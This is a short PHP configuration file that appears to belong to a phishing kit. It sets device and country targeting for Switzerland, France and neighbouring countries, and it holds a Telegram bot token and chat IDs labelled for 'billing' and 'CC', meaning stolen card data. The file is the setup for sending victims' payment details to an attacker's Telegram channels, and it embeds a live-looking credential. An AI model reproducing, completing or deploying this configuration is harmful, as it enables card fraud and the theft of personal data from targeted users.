<?php

// Prevent direct access
if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    header('HTTP/1.1 403 Forbidden');
    exit();
}

//   _____         _ __      __     
//  / ____|  /\   | |\ \    / /\    
// | (___   /  \  | | \ \  / /  \   
//  \___ \ / /\ \ | |  \ \/ / /\ \  
//  ____) / ____ \| |___\  / ____ \ 
// |_____/_/    \_\______\/_/    \_\

// ONLY MOBILE : true = uniquement mobile, false = uniquement PC, null = tout le monde
$only_mobile = null;

// ALLOWED COUNTRIES: Only Switzerland, France, UK, and neighboring countries
$allowed_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI', 'GB'];
$restricted_countries = []; // Empty list means no countries are blocked

// CLICKS / BILLING
$bot_token = '8688242246:AAGd1xvEn-r6H3rnlIlOBpw5RrEvJAOwnU0';
$chat_id = '-5242371327';

// CC
$botToken = '8688242246:AAGd1xvEn-r6H3rnlIlOBpw5RrEvJAOwnU0'; 
$chatId = '-5268721153'; // ID Distinct pour les CC 

?>